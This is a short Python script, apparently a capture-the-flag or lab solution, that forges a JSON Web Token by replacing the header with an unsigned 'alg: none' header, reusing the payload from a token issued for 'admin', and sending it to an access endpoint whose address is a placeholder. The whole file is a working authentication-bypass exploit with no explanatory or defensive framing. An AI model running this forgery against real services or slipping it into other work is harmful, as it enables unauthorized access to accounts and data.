import requests
import base64

auth_url = "https://<url>/auth"
access_url = "https://<url>/access"

response = requests.post(auth_url, json={"username": "admin"})
response_header = b'{"alg": "none", "typ": "JWT"}'
response_payload = base64.b64decode(response.json()["token"].split(".")[1] + "==")

headers = {"Authorization": f"Bearer {base64.b64encode(response_header).decode().rstrip('=')}.{base64.b64encode(response_payload).decode().rstrip('=')}."}
response = requests.get(access_url, headers=headers)
print(response.text)
